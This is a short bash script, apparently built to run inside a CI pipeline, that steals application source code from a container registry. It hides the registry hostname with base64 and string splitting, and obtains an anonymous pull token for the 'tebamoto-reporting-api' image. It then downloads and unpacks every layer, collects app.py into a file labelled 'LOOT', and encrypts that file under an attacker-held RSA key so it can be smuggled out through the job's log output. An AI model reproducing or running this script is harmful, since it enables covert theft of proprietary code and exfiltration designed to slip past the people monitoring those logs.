#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; REG=$(printf '%s' 'Y3J0YmxwbGF0cHJvZHgzZXVvei5henVyZWNyLmlv' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
TK=$(curl -sS -G "${SC}${REG}/oauth2/token" --data-urlencode "service=${REG}" --data-urlencode "scope=repository:tebamoto-reporting-api:pull" | jq -r '.access_token // empty')
M=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${REG}/v2/tebamoto-reporting-api/manifests/sha256:9b4b3b833920bf99c944e5d12732f1b505355b12926796e59f22945a88bcfeb9")
say "MAN: $M"
for L in $(printf '%s' "$M" | grep -oE 'sha256:[a-f0-9]+' | sort -u); do
  curl -sL -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/blobs/$L" -o /tmp/l.tgz 2>/dev/null
  say "LAYER $L $(wc -c </tmp/l.tgz) :: $(tar -tzf /tmp/l.tgz 2>/dev/null | tr '\n' ' ' | head -c 600)"
  tar -xzf /tmp/l.tgz -C /tmp 2>/dev/null
  if [ -f /tmp/app/app.py ]; then say "APP.PY: $(cat /tmp/app/app.py)"; cp /tmp/app/app.py /tmp/app_app.py; fi
done
[ -f /tmp/app_app.py ] && say "SRC: $(cat /tmp/app_app.py)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
